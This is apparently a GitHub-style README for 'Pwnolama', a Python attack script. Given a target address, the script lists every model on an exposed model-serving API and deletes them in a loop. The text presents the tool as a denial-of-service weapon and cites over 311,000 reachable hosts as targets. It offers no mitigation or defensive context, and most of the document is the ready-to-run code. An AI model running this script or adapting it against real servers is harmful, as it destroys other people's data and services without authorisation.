# Pwnolama
Using this we can delete all the existing models and cause DOS right now 311,159 hosts are running this software.

```
import requests
import time
import sys

# ASCII Art
ascii_art = r'''                        
________  _  ______   ____ |  | _____    _____ _____   
\____ \ \/ \/ /    \ /  _ \|  | \__  \  /     \\__  \  
|  |_> >     /   |  (  <_> )  |__/ __ \|  Y Y  \/ __ \_
|   __/ \/\_/|___|  /\____/|____(____  /__|_|  (____  /
|__|              \/                 \/      \/     \/ 

by @vishwaraj101
'''
print(ascii_art)

# Check if target argument is provided
if len(sys.argv) < 2:
    print("❌ Error: Please provide the target IP as an argument.")
    print("Usage: python script.py <target-ip>")
    sys.exit(1)

# Get target IP from arguments
target = sys.argv[1]
base_url = f"{target}"

def delete(model):
    """Delete a specific model."""
    url = f"{base_url}/api/delete"
    payload = {"model": model}

    try:
        response = requests.delete(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f"✅ Model '{model}' deleted successfully.")
        else:
            print(f"❌ Failed to delete '{model}'. Status Code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"⚠️ Error deleting model '{model}': {e}")

def get_models():
    """Fetch all available models."""
    url = f"{base_url}/api/tags"
    
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return [model["name"] for model in data.get("models", [])]
        else:
            print(f"⚠️ Failed to fetch models. Status Code: {response.status_code}")
            return []
    except requests.exceptions.RequestException as e:
        print(f"⚠️ Error fetching models: {e}")
        return []

# Keep deleting models until none are left
while True:
    models = get_models()

    if not models:
        print("🎉 All models have been deleted!")
        break

    for model in models:
        delete(model)
        time.sleep(1)  # Optional delay to avoid rapid requests
```
### Impact
Using this we can delete all the existing models and cause DOS right now 311,159 hosts are running this software.
